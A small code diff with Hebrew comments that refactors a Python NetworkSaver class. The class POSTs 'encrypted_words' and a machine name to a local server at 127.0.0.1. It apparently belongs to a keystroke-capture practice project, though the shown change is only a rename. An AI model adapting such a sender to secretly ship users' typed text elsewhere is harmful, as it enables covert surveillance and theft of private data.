@@ -1,11 +1,11 @@
 import requests
-from interface_agent import IWriter
+from iWriter import IWriter
 
 
 class NetworkSaver(IWriter):
     def __init__(self):
         """אתחול המחלקה."""
-        self.server_url = "http://127.0.0.1:5000"  # כתובת השרת שאליו נשלחים הנתונים
+        self.SERVER_URL = "http://127.0.0.1:5000"  # כתובת השרת שאליו נשלחים הנתונים
 
     def send_data(self, encrypted_words: str, machine_name: str):
         """
@@ -28,7 +28,7 @@ class NetworkSaver(IWriter):
 
         try:
             # שולח את הנתונים לשרת באמצעות בקשת POST
-            response = requests.post(f"{self.server_url}/api/send_data", json=payload)
+            response = requests.post(f"{self.SERVER_URL}/api/send_data", json=payload)
 
             # בודק אם התשובה מהשרת היא 200 (הצלחה)
             if response.status_code == 200:
